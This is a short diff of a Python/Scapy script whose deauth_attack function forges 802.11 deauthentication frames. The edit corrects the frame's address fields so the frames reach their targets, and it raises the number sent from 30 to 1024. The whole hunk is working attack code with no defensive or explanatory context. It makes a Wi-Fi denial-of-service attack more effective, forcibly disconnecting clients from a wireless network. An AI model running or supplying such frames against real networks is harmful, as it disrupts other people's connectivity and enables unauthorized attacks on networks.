@@ -23,11 +23,11 @@ def deauth_attack():
 
     # Deauthentication
     deauth_frame = RadioTap()\
-            /Dot11(type=0, subtype=12, addr1=src, addr2=dest, addr3=dest)\
+            /Dot11(type=0, subtype=12, addr1=dest, addr2=src, addr3=src)\
             /Dot11Deauth(reason=7)
     
     print(WARN_STR+" Attack")
-    for i in range(0, 30):
+    for i in range(0, 1024):
         sendp(deauth_frame, iface=iface)
         printProgressBar()
 
